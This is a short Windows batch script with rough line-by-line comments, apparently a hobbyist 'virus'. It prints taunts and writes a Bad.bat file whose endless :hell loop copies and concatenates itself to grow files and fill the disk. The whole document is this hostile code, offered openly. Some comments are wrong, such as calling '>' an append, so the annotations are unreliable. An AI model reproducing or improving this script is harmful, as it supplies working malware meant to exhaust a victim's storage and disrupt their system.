@echo off         - turn off echo
echo Your need this!!!  -print text in screen
echo Die Now sucker............................................ -same with above

echo :hell > Bad.bat  - print hell into bad.bat with append     
echo copy bad.bat bad1.bat >> Bad.bat - same
echo copy bad.bat+bad1.bat bad2.bat >> Bad.bat
echo goto hell >> Bad.bat - this is make file become larger
cd\                       - change directory
goto next                 - go to next
:next
echo :hell > Bad.bat
echo copy bad.bat bad1.bat >> Bad.bat
echo copy bad.bat+bad1.bat bad2.bat >> Bad.bat
echo goto hell >> Bad.bat
echo ------- EnD Of FilE -------------